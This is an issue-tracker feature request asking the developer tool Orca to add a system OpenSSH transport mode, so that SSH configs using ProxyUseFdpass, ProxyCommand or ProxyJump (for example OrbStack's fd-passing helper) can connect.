Orca currently cannot connect using SSH configs that require file descriptor passing (ProxyUseFdpass) such as when using OrbStack's ssh-proxy-fdpass helper or similar enterprise infrastructure. In these environments, OpenSSH can transparently accept a socket file descriptor from the proxy command, but Orca (using ssh2) fails to connect, requiring users to manually craft separate configs or workarounds just for Orca. This makes workflows inconsistent for advanced SSH users and blocks developer infrastructure setups relying on modern SSH proxy techniques.

### Proposed solution

Add a system SSH transport mode in Orca, where Orca spawns the user's OpenSSH (`ssh`) binary as the underlying transport for any host using ProxyUseFdpass or otherwise requiring advanced proxy methods. Pipe Orca's relay/protocol over this SSH session, allowing all OpenSSH-supported behaviors (ProxyCommand, ProxyJump, ProxyUseFdpass, etc.). This enables full SSH config compatibility and workflows that depend on FD-passing proxies matching what is possible in a standard terminal with OpenSSH. Optionally, provide a per-target or automatic switch based on SSH config parsing. I did see a comment about some thoughts on doing this eventually though it's not fully fleshed out.

### Alternatives or additional context

Workarounds include creating a separate SSH config entry that does not use ProxyUseFdpass (using ProxyJump or stdio-based ProxyCommand instead), but this limits the flexibility and security of network access. This feature matches how VS Code and other tools support advanced SSH connection techniques by leveraging OpenSSH for transport when needed. References: OrbStack docs (https://docs.orbstack.dev/networking/ssh), previous Orca discussions, and Orca's existing connectViaSystemSsh() implementation that can serve as a foundation for this feature.
payload.title: [Feature]: Support system SSH transport to enable ProxyUseFdpass and advanced SSH proxy methods
